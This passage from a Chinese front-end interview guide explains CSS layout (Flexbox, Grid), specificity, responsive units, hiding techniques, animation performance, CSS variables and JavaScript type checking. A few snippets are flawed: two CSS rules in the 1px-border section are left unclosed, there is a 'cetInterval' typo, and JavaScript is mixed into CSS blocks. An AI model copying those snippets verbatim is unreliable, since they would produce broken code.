  margin-left: -100%;
}
.right {
  float: left;
  width: 200px;
  margin-left: -200px;
}
```

**面试要点：** 圣杯布局和双飞翼布局是经典题，考察的是负 margin 和 float 的深度理解。现代开发直接用 flex/grid 就行。

---

### 13. Flexbox 弹性布局：常用的属性有哪些？

**⭐⭐⭐⭐ · 高频**

```css
/* ===== 容器属性（父元素设置）===== */
.container {
  display: flex;
  /* 或 display: inline-flex */

  /* 主轴方向 */
  flex-direction: row | row-reverse | column | column-reverse;

  /* 是否换行 */
  flex-wrap: nowrap | wrap | wrap-reverse;

  /* flex-direction + flex-wrap 简写 */
  flex-flow: row nowrap;

  /* 主轴对齐方式 */
  justify-content: flex-start | flex-end | center | space-between | space-around | space-evenly;

  /* 交叉轴对齐方式 */
  align-items: stretch | flex-start | flex-end | center | baseline;

  /* 多行时的交叉轴对齐 */
  align-content: stretch | flex-start | flex-end | center | space-between | space-around;
}

/* ===== 项目属性（子元素设置）===== */
.item {
  /* 排列顺序（默认 0，越小越靠前）*/
  order: 0;

  /* 放大比例（默认 0，不放大）*/
  flex-grow: 1;

  /* 缩小比例（默认 1，空间不足时缩小）*/
  flex-shrink: 0; /* 设置 0 不缩小 */

  /* 初始大小 */
  flex-basis: auto | 200px | 50%;

  /* flex-grow + flex-shrink + flex-basis 简写 */
  /* 推荐写法 */
  flex: 1;              /* 1 1 0% —— 等分剩余空间 */
  flex: auto;           /* 1 1 auto —— 按内容等分 */
  flex: none;           /* 0 0 auto —— 不伸缩 */
  flex: 0 0 200px;      /* 固定 200px */

  /* 单独设置交叉轴对齐 */
  align-self: auto | flex-start | flex-end | center | baseline | stretch;
}
```

#### justify-content 可视化

```
flex-start:  [A][B][C]               ─────────────
flex-end:               [A][B][C]    ─────────────
center:         [A][B][C]            ─────────────
space-between: [A]        [B]        [C]
space-around:  =[A]==      =[B]=      =[C]=       (= 表示等宽间距)
space-evenly:  ==[A]===    ==[B]===    ==[C]===
```

#### 常见 Flex 布局案例

```css
/* 1. 等分 n 列 */
.child { flex: 1; }

/* 2. 左侧固定 + 右侧自适应 */
.left { width: 200px; flex-shrink: 0; }
.right { flex: 1; }

/* 3. 导航栏左 logo 右按钮 */
.nav {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

/* 4. 卡片底部按钮始终在底部 */
.card {
  display: flex;
  flex-direction: column;
}
.card-body { flex: 1; }
.card-footer { /* 自然在底部 */ }

/* 5. 九宫格 */
.grid {
  display: flex;
  flex-wrap: wrap;
}
.grid-item {
  flex: 0 0 calc(33.333% - 10px);
  margin: 5px;
}
```

**面试要点：** 重点区分 `flex: 1`（等分空间）和 `flex: auto`（按内容等分）。能说出 flex-grow 的分配算法是加分项（剩余空间按 grow 比例分配）。

---

### 14. Grid 布局 vs Flexbox：区别与选型？

**⭐⭐⭐**

```css
/* ===== Grid: 二维布局（行 + 列）===== */
.container {
  display: grid;
  grid-template-columns: 200px 1fr 1fr;
  grid-template-rows: 60px 1fr 60px;
  gap: 10px;
  grid-template-areas:
    "header header header"
    "sidebar main   main"
    "footer footer footer";
}
.header { grid-area: header; }
.sidebar { grid-area: sidebar; }
.main { grid-area: main; }
.footer { grid-area: footer; }

/* ===== Flexbox: 一维布局（主轴 × 交叉轴）===== */
.container {
  display: flex;
  flex-direction: column;
}
.container > .main-content {
  display: flex;
}
.sidebar { width: 200px; }
.main { flex: 1; }
```

```css
/* Grid 核心属性速查 */
.grid {
  display: grid;

  /* 列轨道定义 */
  grid-template-columns: 200px 1fr 2fr;
  grid-template-columns: repeat(3, 1fr);              /* 等分 3 列 */
  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); /* 自适应列数 */

  /* 行轨道定义 */
  grid-template-rows: 100px auto 100px;

  /* 间距 */
  gap: 20px;
  row-gap: 10px;
  column-gap: 20px;

  /* 隐式轨道大小 */
  grid-auto-rows: minmax(100px, auto);

  /* 网格项对齐 */
  justify-items: stretch | start | center | end;
  align-items: stretch | start | center | end;
  place-items: center; /* 简写 */

  /* 内容区域对齐 */
  justify-content: start | center | end | space-between;
  align-content: start | center | end;
  place-content: center; /* 简写 */
}

.item {
  /* 网格项位置 */
  grid-column: 1 / 3;       /* 从第 1 条线到第 3 条线 */
  grid-column: span 2;      /* 跨越 2 列 */
  grid-row: 1 / -1;         /* 从第 1 行到最后一行 */

  /* 简写 */
  grid-area: 1 / 1 / 3 / 3; /* row-start / col-start / row-end / col-end */
}
```

#### 选型指南

| 场景 | 推荐 | 原因 |
|------|------|------|
| 整体页面布局（header/sidebar/main/footer） | Grid | 二维，语义清晰 |
| 导航栏、工具栏 | Flex | 一维，简单 |
| 卡片列表 | Grid | 等宽多列 |
| 表单行（label + input） | Flex | 一行内对齐 |
| 响应式图片画廊 | Grid | `auto-fill` + `minmax` |
| 垂直居中单个元素 | Flex | 最简单 |
| 复杂仪表盘 | Grid | `grid-template-areas` 可视化 |

**面试要点：** "一维用 Flex，二维用 Grid" 是标准答案。但要说清楚——Flex 也可以在二维排列（靠 wrap），但 Grid 更擅长精确的行列控制。

---

### 15. CSS 优先级（选择器权重）是什么？如何计算？

**⭐⭐⭐⭐ · 必问**

```
!important > 内联样式(1000) > ID选择器(100) > 类/伪类/属性(10) > 标签/伪元素(1) > 通配符(0) > 继承(无)

记忆口诀：0,0,0,0 = !important, 内联样式, ID, 类+属性+伪类, 标签+伪元素
```

```css
/* 具体优先级计算 */
*              /* 0,0,0,0 */
h1             /* 0,0,0,1 */
h1::before     /* 0,0,0,2 */
p + p          /* 0,0,0,2 */
div p          /* 0,0,0,2 */
.btn           /* 0,0,1,0 */
.btn:hover     /* 0,0,2,0 */
[type="text"]  /* 0,0,1,0 */
#app           /* 0,1,0,0 */
<div style=""> /* 1,0,0,0 */
!important     /* 最高，无视一切（但不要用）*/

/* 比较：多个选择器累加 */
#header .nav a:hover  /* 0,1,2,1 (1个ID + 2个类/伪类 + 1个标签) */
div#header .nav       /* 0,1,1,1 (1个ID + 1个类 + 1个标签) */
/* ① > ② 因为 ID 数量相同但 ① 的类数量更多 */

/* ⚠️ 注意：优先级不进位！*/
/* 无论多少级类选择器叠加，都比不上一个 ID */
.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v
/* 0,0,22,0 < 0,1,0,0 (一个 ID 就赢了) */
```

#### 实际开发建议

```css
/* ❌ 不好：优先级混乱，难以覆盖 */
#app .content .list .item .title { color: red; }

/* ✅ 好的实践 */
/* 1. 尽量用单层类选择器 */
.item-title { color: red; }

/* 2. 用 BEM 等命名规范 */
.block__element--modifier { }

/* 3. 不要用 ID 做样式选择器（留给 JS 和锚点）*/
/* 4. 不要用 !important（除非覆盖第三方库）*/
/* 5. 考虑使用 CSS 层叠层 @layer */
@layer base, components, utilities;

@layer base {
  h1 { font-size: 2rem; }
}

@layer components {
  .card h1 { font-size: 1.5rem; }
}

@layer utilities {
  .text-sm { font-size: 0.875rem; }
}
/* layer 优先级：后声明的 layer > 先声明的 layer
   utilities > components > base */
```

**面试要点：** 说出 !important > 内联 > ID > 类 > 标签 > 通配符 这个顺序。能提到 `@layer` 是加分项。

---

### 16. 响应式设计如何实现？rem、em、vw、vh 的区别？

**⭐⭐⭐⭐ · 高频**

```css
/* ===== 响应式设计三要素 ===== */
/* 1. 流式布局 (Fluid) + 2. 弹性媒体 + 3. 媒体查询 */

/* ===== CSS 单位对比 ===== */
/* px: 绝对像素，不会缩放 */
.fixed { width: 300px; }

/* em: 相对父元素的 font-size */
.parent { font-size: 20px; }
.child { width: 2em; }     /* 40px */
  .grandchild { width: 2em; } /* 80px (累积计算，容易失控) */

/* rem: 相对根元素 (html) 的 font-size */
html { font-size: 16px; }
.element {
  width: 10rem;  /* 160px */
  font-size: 1.5rem; /* 24px */
}

/* vw: 相对视口宽度的 1% */
.full-width { width: 100vw; }
.half-width { width: 50vw; }

/* vh: 相对视口高度的 1% */
.full-height { height: 100vh; }

/* vmin: vw 和 vh 中较小的 */
.square-vmin { width: 50vmin; height: 50vmin; }

/* vmax: vw 和 vh 中较大的 */
.cover { width: 100vmax; }

/* dvh/dvw: 动态视口单位（考虑移动端地址栏）*/
.hero { height: 100dvh; } /* 更准确的全屏高度 */

/* svh/svw: 小视口（地址栏展开时）*/
/* lvh/lvw: 大视口（地址栏收起时）*/

/* %: 相对父元素的同属性 */
.parent { width: 800px; }
.child { width: 50%; } /* 400px */
  /* 但 height: 100% 需要父元素有明确高度 */
```

#### 移动端适配方案

```css
/* 方案 1: rem + 动态设置根字体大小（经典方案）*/
html {
  font-size: calc(100vw / 375 * 100);
  /* 375px 设计稿下，1rem = 100px */
}
/* 设计稿 20px 元素 → CSS 写 0.2rem */
/* 不同屏幕宽度下等比缩放 */

/* 更好的 rem 方案（限制最大最小）*/
html {
  font-size: clamp(12px, calc(100vw / 375 * 100), 20px);
}

/* 方案 2: vw 方案（无需 JS）*/
/* PostCSS 插件 postcss-px-to-viewport 自动转换 */
/* 设计稿 20px → CSS 自动转换为 calc(20 / 375 * 100vw) */
```

#### 媒体查询

```css
/* 移动优先（min-width）*/
.component { /* 移动端默认样式 */ }

@media (min-width: 768px) {
  .component { /* 平板样式 */ }
}

@media (min-width: 1024px) {
  .component { /* 桌面端样式 */ }
}

/* 桌面优先（max-width）*/
.component { /* 桌面端默认样式 */ }

@media (max-width: 1024px) {
  .component { /* 平板样式 */ }
}

@media (max-width: 768px) {
  .component { /* 移动端样式 */ }
}

/* 容器查询（CSS Container Queries，2024+ 新特性）*/
.card-container {
  container-type: inline-size;
  container-name: card;
}

@container card (min-width: 400px) {
  .card {
    display: grid;
    grid-template-columns: 1fr 2fr;
  }
}
/* 基于父容器宽度响应，而非视口宽度！*/

/* 响应式排版 */
h1 { font-size: clamp(1.5rem, 4vw, 3rem); }
/* 最小 1.5rem，理想 4vw，最大 3rem */
```

#### 单位选型指南

| 场景 | 推荐单位 | 原因 |
|------|----------|------|
| 字体大小 | rem | 可统一缩放，尊重用户字体设置 |
| 间距/边距 | rem 或 px | rem 跟随字体缩放 |
| 全屏容器 | dvh, vw | 视口单位 |
| 最大宽度限制 | px + max-width | 防止超宽屏幕 |
| 边框宽度 | px | 不应随字体缩放 |
| 移动端适配 | rem + vw | 等比缩放 |
| 宽高比 | aspect-ratio | 现代方案 |

```css
/* 典型的响应式图片 */
img {
  max-width: 100%;
  height: auto;
  /* 永远不会超出容器 */
}

picture > source {
  /* 根据媒体查询切换图片 */
}
<picture>
  <source media="(min-width: 1024px)" srcset="large.jpg">
  <source media="(min-width: 768px)" srcset="medium.jpg">
  <img src="small.jpg" alt="响应式图片">
</picture>
```

**面试要点：** rem 配合动态根字体大小是移动端适配经典方案。提到 dvh/lvh/svh 表示你关注新规范，提到 Container Queries 是强力加分项。

---

### 17. CSS 隐藏元素的几种方式及其区别？

**⭐⭐⭐**

```css
/* 方式 1: display: none */
.hide-display {
  display: none;
  /* ❌ 不占空间、不渲染、不触发事件 */
  /* 回流(Reflow)发生 */
}

/* 方式 2: visibility: hidden */
.hide-visibility {
  visibility: hidden;
  /* 占空间（在布局中保留位置）*/
  /* 不触发事件（但有争议）*/
  /* 子元素可设 visibility: visible 显示 */
  /* 重绘(Paint)发生，不回流 */
}

/* 方式 3: opacity: 0 */
.hide-opacity {
  opacity: 0;
  /* 占空间、可触发事件（如点击）*/
  /* 子元素无法通过 opacity: 1 显示 */
  /* 仍在渲染树中，可被屏幕阅读器访问 */
  /* ❌ 子元素可以设置 opacity: 1 吗？不可以！子元素相对父元素透明 */
  /* 仅在合成阶段处理，性能最优 */
}

/* 方式 4: width: 0 + height: 0 + overflow: hidden */
.hide-zero-size {
  width: 0;
  height: 0;
  overflow: hidden;
  border: none;
  padding: 0;
  margin: 0;
  /* 不占空间（严格来说占用 0 空间）*/
}

/* 方式 5: position: absolute + 移出视口 */
.hide-off-screen {
  position: absolute;
  left: -9999px;
  top: -9999px;
  /* 占位置但不影响视觉 */
  /* 屏幕阅读器仍能访问（A11y 友好）*/
}

/* 方式 6: clip-path */
.hide-clip {
  clip-path: circle(0);
  /* 或 clip-path: inset(100%) */
  /* 占空间、不可见、不触发事件 */
}

/* 方式 7: 叠加隐藏 
   display: none > visibility: hidden > opacity: 0 > 其他
   如果多个属性冲突，display: none 优先级最高 */
```

#### 对比总结

| 方式 | 占空间 | 可点击 | 渲染树 | 屏幕阅读器可见 | 动画支持 | 性能影响 |
|------|--------|--------|--------|---------------|----------|----------|
| display: none | ❌ | ❌ | ❌ | ❌ | ❌ | 回流 |
| visibility: hidden | ✅ | ❌ | ✅ | ❌ | ✅ | 重绘 |
| opacity: 0 | ✅ | ✅ | ✅ | ✅ | ✅ | 仅合成 |
| 移出视口 | ✅ | ❌ | ✅ | ✅ | ✅ | 重绘/回流 |
| clip-path | ✅ | ❌ | ✅ | ❌ | ✅ | 仅合成 |

```css
/* ===== 场景选择指南 ===== */

/* 条件渲染（tab 切换） → display: none */
/* 消失动画（fade out）→ opacity: 0 + transition */
/* 保留布局占位（防止抖动）→ visibility: hidden */
/* A11y（传给屏幕阅读器但视觉隐藏）→ 移出视口或专用 .sr-only */
/* 高性能隐藏 → opacity: 0（不触发回流重绘，仅合成）*/

/* 屏幕阅读器专用隐藏（最佳实践）*/
.sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
}
```

**面试要点：** display:none 引起回流（Reflow），visibility:hidden 只引起重绘，opacity:0 只走合成——这是浏览器渲染原理的考点。

---



## 三、CSS 进阶与动画

### 18. CSS 动画：transition 和 animation 的区别？

**⭐⭐⭐⭐ · 高频**

```css
/* ===== transition: 过渡动画 ===== */
/* 需要触发器（hover/focus/JS 添加类名）*/
/* 适合简单的"从 A 到 B"动画 */
/* 只有两个状态：开始和结束 */

.button {
  background: #3498db;
  transition: background 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
  /* 简写: transition: property duration timing-function delay */
}

.button:hover {
  background: #2980b9;
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0,0,0,0.2);
}

/* ===== animation: 关键帧动画 ===== */
/* 无需触发器，可自动播放 */
/* 适合复杂的多阶段动画 */
/* 可以重复、反向、暂停 */

/* 1. 定义关键帧 */
@keyframes slideIn {
  0% {
    opacity: 0;
    transform: translateX(-100%);
  }
  60% {
    transform: translateX(10px);
  }
  80% {
    transform: translateX(-5px);
  }
  100% {
    opacity: 1;
    transform: translateX(0);
  }
}

/* 2. 应用动画 */
.element {
  animation: slideIn 0.6s ease-out 0.2s both;
  /* 简写: name duration timing-function delay iteration-count direction fill-mode play-state */
}

/* ===== animation 完整写法 ===== */
.complex {
  animation-name: slideIn;
  animation-duration: 1s;
  animation-timing-function: cubic-bezier(0.25, 0.1, 0.25, 1);
  animation-delay: 0.5s;
  animation-iteration-count: 3;       /* infinite 无限循环 */
  animation-direction: alternate;     /* 来回播放 */
  animation-fill-mode: forwards;      /* 保持结束状态 */
  animation-play-state: running;      /* paused 暂停 */
}
```

#### animation-fill-mode 详解

```css
/* none: 默认，动画结束后回到初始状态 */
/* forwards: 保持最后一帧的状态 */
/* backwards: 在 delay 期间应用第一帧的状态 */
/* both: forwards + backwards */
```

#### timing-function

```
linear:         ──────── 匀速
ease:           ╱────     慢→快→慢（默认）
ease-in:        ╱───     慢→快
ease-out:       ───╲     快→慢
ease-in-out:    ╱──╲     慢→快→慢（比 ease 更平滑）
cubic-bezier(n,n,n,n): 自定义贝塞尔曲线
steps(n, start|end): 逐帧动画
```

```css
/* 逐帧动画（精灵图）*/
@keyframes sprite {
  from { background-position: 0 0; }
  to { background-position: -600px 0; }
}
.sprite {
  width: 100px;
  height: 100px;
  background: url(sprite.png);
  animation: sprite 1s steps(6) infinite;
}

/* ===== 对比总结 ===== */
/* transition:
   - 需要触发（hover/JS 添加 class）
   - 只有 from → to 两个状态
   - 单向：触发一次执行一次
   - 无法控制中间状态
   - 适合：hover 效果、简单的显示/隐藏

   animation:
   - 无需触发，自动执行
   - 可以有多个关键帧（0%/25%/50%/75%/100%）
   - 可重复、反向、暂停
   - 精细控制每个阶段
   - 适合：加载动画、复杂动效、循环动画
*/
```

```javascript
// JS 控制动画
const el = document.querySelector('.animated')

// 监听动画事件
el.addEventListener('animationstart', () => console.log('开始'))
el.addEventListener('animationend', () => console.log('结束'))
el.addEventListener('animationiteration', () => console.log('循环一次'))
el.addEventListener('transitionend', () => console.log('过渡结束'))

// 动态控制
el.style.animationPlayState = 'paused'
el.style.animationPlayState = 'running'

// 获取动画进度（Web Animations API）
const anim = el.animate([
  { transform: 'translateX(0)' },
  { transform: 'translateX(300px)' }
], { duration: 1000, fill: 'forwards' })

anim.pause()
anim.play()
anim.reverse()
anim.finish()
```

**面试要点：** transition 需要触发器，只有两个状态；animation 自动执行，可以多关键帧控制。Web Animations API 也是加分项。

---

### 19. 如何实现高性能动画？什么属性触发回流/重绘/合成？

**⭐⭐⭐⭐ · 高频**

```css
/* ===== 只触发合成的属性（最高性能，推荐）===== */
/* ⭐ 这些属性在 GPU 合成线程上处理，不阻塞主线程 */
.high-perf {
  transform: translateX(100px) scale(1.2) rotate(45deg);
  opacity: 0.5;
  /* filter 在部分浏览器也走合成层 */
}

/* ===== 触发重绘但不触发回流 ===== */
.trigger-paint {
  color: red;
  background-color: blue;
  visibility: visible;
  outline-color: green;
  border-color: yellow;
  box-shadow: 0 0 10px rgba(0,0,0,0.5);
}

/* ===== 触发回流（最耗性能，避免）===== */
.trigger-reflow {
  width: 100px;
  height: 100px;
  margin: 10px;
  padding: 10px;
  left: 10px; /* 无定位时无效 */
  font-size: 16px;
  display: flex;
  border-width: 2px;
  /* ...几乎任何改变布局的属性 */
}
```

#### 渲染流水线

```
┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
│ JavaScript │ → │  Style   │ → │  Layout  │ → │  Paint   │ → │ Composite │
│   (JS)    │   │ (CSS计算)│   │  (布局)  │   │  (绘制)  │   │  (合成)   │
└──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘
                     ↑               ↑               ↑              ↑
                 只改颜色        改宽高/定位      改文字/背景    transform/opacity
                 (重绘)          (回流+重绘)      (回流+重绘)    (仅合成 ⭐)

opacity 的坑：虽然不是回流，但如果前面触发回流，一样要全流程走一遍
```

#### GPU 加速技巧

```css
/* 方式 1: 使用 will-change 提前告知浏览器 */
.element {
  will-change: transform;
  /* 浏览器将该元素提升到独立合成层 */
  /* ⚠️ 不要滥用：太多合成层会导致内存膨胀 */
}

/* ✅ 正确用法：即将动画前添加，动画后移除 */
.element:hover {
  will-change: transform;
}
.element:active {
  will-change: unset;
}

/* 方式 2: 强制 GPU 加速（hack，不推荐）*/
.force-gpu {
  transform: translateZ(0);
  /* 或 transform: translate3d(0, 0, 0) */
  backface-visibility: hidden;
}

/* 方式 3: 使用 contain 限制重绘范围 */
.widget {
  contain: layout style paint;
  /* layout: 内部布局不影响外部 */
  /* style: counter/quote 等不影响外部 */
  /* paint: 内部绘制不超出边界 */
}

/* 方式 4: content-visibility (大量列表) */
.list-item {
  content-visibility: auto;
  contain-intrinsic-size: 0 80px;
  /* 跳过屏幕外元素的渲染，大幅提升长列表性能 */
}
```

#### 实战：高性能动画对比

```css
/* ❌ 低性能：用 left 做平移 */
@keyframes slide-bad {
  from { left: 0; }
  to { left: 300px; }
}
/* 每一帧都触发：Layout → Paint → Composite (高开销) */

/* ✅ 高性能：用 transform 做平移 */
@keyframes slide-good {
  from { transform: translateX(0); }
  to { transform: translateX(300px); }
}
/* 每一帧只触发：Composite (极低开销) */

/* ❌ 低性能过渡 */
.element { transition: width 0.3s; }
/* 触发 Layout 每一帧 */

/* ✅ 高性能过渡 */
.element { transition: transform 0.3s; }
/* 使用 scaleX 模拟宽度变化 */
.element:hover { transform: scaleX(1.2); }
```

#### requestAnimationFrame vs setTimeout

```javascript
// ❌ setTimeout/cetInterval 做动画
// 问题：不跟屏幕刷新率同步，可能掉帧
setInterval(() => {
  element.style.left = position + 'px'
  position++
}, 16) // 60fps ≈ 16.67ms，不精确

// ✅ requestAnimationFrame 做动画
// 优势：浏览器在下次重绘前调用，跟屏幕刷新率同步
function animate() {
  element.style.transform = `translateX(${position}px)`
  position++
  if (position < 300) {
    requestAnimationFrame(animate)
  }
}
requestAnimationFrame(animate)

// rAF 暂停/恢复（页面不可见时自动暂停）
let rafId
document.addEventListener('visibilitychange', () => {
  if (document.hidden) {
    cancelAnimationFrame(rafId) // 页面隐藏时停止
  } else {
    rafId = requestAnimationFrame(animate) // 页面显示时恢复
  }
})
```

**面试要点：** 核心是说清楚渲染流水线：JS → Style → Layout → Paint → Composite。transform/opacity 只走 Composite，是高性能动画的关键。

---

### 20. 移动端 1px 边框问题如何解决？

**⭐⭐⭐**

```css
/* 问题：Retina 屏幕的 1 个 CSS 像素 ≠ 1 个物理像素 */
/* dpr=2: 1px = 2 物理像素，但设计师要的是 1 物理像素 */

/* 方案 1: transform scale (推荐) */
.hairline {
  position: relative;
  border: none;
}
.hairline::after {
  content: '';
  position: absolute;
  left: 0;
  bottom: 0;
  width: 100%;
  height: 1px;
  background: #ddd;
  transform: scaleY(0.5);
  transform-origin: 0 0;
}
/* 2x 屏: scaleY(0.5) → 1 物理像素 */
/* 3x 屏: 需要 scaleY(0.333)，但视觉上 0.33 物理像素太细 */
@media (-webkit-min-device-pixel-ratio: 3) {
  .hairline::after {
    transform: scaleY(0.333);
  }
}

/* 方案 2: viewport + rem 方案 */
/* <meta name="viewport" content="width=device-width, initial-scale=0.333"> */
/* 不推荐：影响整个页面布局 */

/* 方案 3: border-image / background-image */
.hairline-bg {
  background: url(data:image/svg+xml;base64,...) repeat-x 0 0;
  /* 用图片实现，不推荐：难以维护 */

/* 方案 4: box-shadow */
.hairline-shadow {
  box-shadow: 0 0.5px 0 0 #ddd;
  /* 简单但不精确 */

/* 方案 5: 媒体查询设置不同 dpr 下的 border */
.standard {
  border-bottom: 1px solid #ddd;
}
@media (-webkit-min-device-pixel-ratio: 2) {
  .standard {
    border-bottom: 0.5px solid #ddd; /* iOS 8+ 支持小数 px */
  }
}
```

**面试要点：** 伪元素 + transform scale 是工业界最常用的方案。能提到 dpr 概念和 Retina 屏原理是基础。

---

### 21. CSS 变量（Custom Properties）的使用场景？

**⭐⭐⭐**

```css
/* ===== 定义和使用 ===== */
:root {
  /* 全局变量 */
  --primary-color: #3498db;
  --secondary-color: #2ecc71;
  --font-size-base: 16px;
  --spacing-unit: 8px;
  --border-radius: 4px;
  --header-height: 60px;
}

/* 使用 */
.button {
  background: var(--primary-color);
  font-size: var(--font-size-base);
  padding: calc(var(--spacing-unit) * 2) calc(var(--spacing-unit) * 3);
  border-radius: var(--border-radius);
}

/* 带默认值 */
.element {
  color: var(--custom-color, #333); /* --custom-color 不存在则用 #333 */
}

/* 嵌套默认值 */
.element {
  color: var(--color-1, var(--color-2, #333)); /* 链式兜底 */
}
```

#### CSS 变量的强大之处

```css
/* 1. 组件级作用域 */
.card {
  --card-padding: 20px;
  padding: var(--card-padding);
}
.card.compact {
  --card-padding: 10px; /* 只改变量，不用重写整个 padding */
}

/* 2. JS 动态修改 */
// JS 中读写 CSS 变量
document.documentElement.style.setProperty('--primary-color', '#e74c3c')
const color = getComputedStyle(document.documentElement).getPropertyValue('--primary-color')

/* 3. 响应式变量 */
:root {
  --font-size: 14px;
}
@media (min-width: 768px) {
  :root {
    --font-size: 16px;
  }
}

/* 4. 主题切换 */
:root {
  --bg: #fff;
  --text: #333;
}

[data-theme="dark"] {
  --bg: #1a1a2e;
  --text: #eee;
}

body {
  background: var(--bg);
  color: var(--text);
  transition: background 0.3s, color 0.3s;
}

// JS 切换
const toggleTheme = document.getElementById('toggle-theme')
toggleTheme.addEventListener('click', () => {
  const theme = document.documentElement.getAttribute('data-theme')
  document.documentElement.setAttribute('data-theme', theme === 'dark' ? '' : 'dark')
})

/* 5. 数学计算 */
.element {
  --columns: 3;
  width: calc(100% / var(--columns));
  /* 相比 Sass/Less 变量，CSS 变量可以在运行时改变 */
}

/* 6. 动画中使用（Sass 变量做不到的）*/
@keyframes pulse {
  50% {
    color: var(--dynamic-color, red);
  }
}

/* 7. inherit 技巧 */
.parent {
  --gap: 20px;
}
.child {
  padding: var(--gap); /* 自动继承父元素的值 */
}
```

#### CSS 变量 vs 预处理器变量

| 特性 | CSS 变量 | Sass/Less 变量 |
|------|----------|---------------|
| 运行时动态 | ✅ 可以 JS 修改、媒体查询 | ❌ 编译后固定 |
| 作用域 | 级联继承 | 块作用域/全局 |
| 动画支持 | ✅ | ❌ |
| 计算 | calc() | 编译时计算 |
| DOM 依赖 | ✅ 可读取计算值 | ❌ |
| 兼容性 | IE 不支持 | 全兼容 |

**面试要点：** CSS 变量的 killer feature 是「运行时动态」——Sass 变量编译后就是死值，CSS 变量可以 JS 改、媒体查询改、组件覆盖。

---

### 22. 如何用纯 CSS 实现一个三角形？

**⭐⭐**

```css
/* 原理：宽高为 0，利用 border 的梯形特性 */
.triangle-up {
  width: 0;
  height: 0;
  border-left: 20px solid transparent;
  border-right: 20px solid transparent;
  border-bottom: 30px solid #333;
}

.triangle-down {
  width: 0;
  height: 0;
  border-left: 20px solid transparent;
  border-right: 20px solid transparent;
  border-top: 30px solid #333;
}

.triangle-left {
  width: 0;
  height: 0;
  border-top: 20px solid transparent;
  border-bottom: 20px solid transparent;
  border-right: 30px solid #333;
}

.triangle-right {
  width: 0;
  height: 0;
  border-top: 20px solid transparent;
  border-bottom: 20px solid transparent;
  border-left: 30px solid #333;
}

/* 直角三角形 */
.triangle-top-right {
  width: 0;
  height: 0;
  border-top: 30px solid #333;
  border-left: 30px solid transparent;
}

/* 原理图解（border 交界处是斜的）：
   如果 width/height=0，4 条 border 会形成 4 个三角形
   保留需要的，把不用的设透明即可
*/

/* 现代替代方案：clip-path（更灵活）*/
.triangle-clip {
  width: 40px;
  height: 40px;
  background: #333;
  clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
}
/* 可以用任何百分比生成任意形状：梯形、菱形、五角星等 */
```

---



## 四、JavaScript 核心基础

### 23. JavaScript 的数据类型有哪些？如何判断？

**⭐⭐⭐⭐⭐ · 必问**

```javascript
// ===== 8 种数据类型 =====
// 原始类型（7 种）：存储在栈内存，不可变
typeof undefined          // 'undefined'
typeof true              // 'boolean'
typeof 42                // 'number'
typeof 9007199254740991n // 'bigint'
typeof 'hello'           // 'string'
typeof Symbol('id')      // 'symbol'

// 特殊：null 的 typeof 历史遗留 bug
typeof null              // 'object' ← 第一版 JS 的 bug，一直没修

// 应用类型（1 种）：存储在堆内存
typeof {}                // 'object'
typeof []                // 'object'
typeof function(){}      // 'function' ← 函数的特殊待遇
typeof /regex/           // 'object'（部分老浏览器返回 'function'）
```

#### 类型判断方法完整对比

```javascript
// 方式 1: typeof —— 判断原始类型（除了 null）
typeof 42          // 'number'
typeof 'hello'     // 'string'
typeof true        // 'boolean'
typeof undefined   // 'undefined'
typeof Symbol()    // 'symbol'
typeof 10n         // 'bigint'
typeof {}          // 'object'
typeof []          // 'object'  ← 无法区分
typeof null        // 'object'  ← bug
typeof function(){} // 'function'

// 方式 2: instanceof —— 判断引用类型的原型链
[] instanceof Array        // true
{} instanceof Object       // true
new Date() instanceof Date // true
function foo() {}
foo instanceof Function    // true

// ⚠️ 跨 iframe 或 realm 时失效（不同执行环境原型链不同）
const iframe = document.createElement('iframe')
document.body.appendChild(iframe)
const iframeArr = new iframe.contentWindow.Array(1, 2, 3)
iframeArr instanceof Array  // false! ← 不同 window 的 Array 构造函数不同

// 方式 3: Object.prototype.toString.call() —— 万能方法 ⭐
const typeOf = (val) => Object.prototype.toString.call(val).slice(8, -1)

typeOf(42)          // 'Number'
typeOf('hello')     // 'String'
typeOf(true)        // 'Boolean'
typeOf(undefined)   // 'Undefined'
typeOf(null)        // 'Null'       ← 正确！
typeOf(Symbol())    // 'Symbol'
typeOf(10n)         // 'BigInt'
typeOf({})          // 'Object'
typeOf([])          // 'Array'      ← 正确！
typeOf(new Date())  // 'Date'
typeOf(/regex/)     // 'RegExp'
typeOf(new Map())   // 'Map'
typeOf(new Set())   // 'Set'
typeOf(new Promise(()=>{})) // 'Promise'
typeOf(function(){}) // 'Function'
typeOf(new Error())  // 'Error'

// 方式 4: Array.isArray() —— 专门判断数组（解决跨 iframe 问题）
Array.isArray([])            // true
Array.isArray(iframeArr)     // true ← 解决 instanceof 跨 iframe 问题
Array.isArray({})            // false
Array.isArray({ length: 0 }) // false ← 不会误判类数组

// 方式 5: constructor（不推荐，容易被改写）
[].constructor === Array     // true
// 缺点：undefined/null 会报错，prototype 可以被改写

// 方式 6: Number.isNaN / Object.is
Number.isNaN(NaN)            // true
Number.isNaN('abc')          // false ← 更严格
isNaN('abc')                 // true  ← 全局的会先转 Number

Object.is(NaN, NaN)          // true  (=== 为 false)
Object.is(+0, -0)            // false (=== 为 true)
```

```javascript
// ===== 推荐的类型判断工具函数 =====
const isType = (type) => (val) =>
  Object.prototype.toString.call(val) === `[object ${type}]`

const isString = isType('String')
const isNumber = isType('Number')
const isArray = Array.isArray
const isObject = (val) => val !== null && typeof val === 'object'
const isPlainObject = (val) => isType('Object')(val) // 纯对象
const isPromise = (val) =>
  !!val && (typeof val === 'object' || typeof val === 'function') && typeof val.then === 'function'
```

**面试要点：** typeof 的 null bug、instanceof 的跨 iframe 问题、Object.prototype.toString.call 是万能方案——三个全说出来。

---

### 24. 原型和原型链是什么？怎么工作？

**⭐⭐⭐⭐⭐ · 必问**

```javascript
// ===== 核心三要素 =====
// 1. 构造函数：有 prototype 属性指向原型对象
// 2. 原型对象：有 constructor 属性指回构造函数
// 3. 实例对象：有 __proto__ 指向原型对象

function Person(name) {
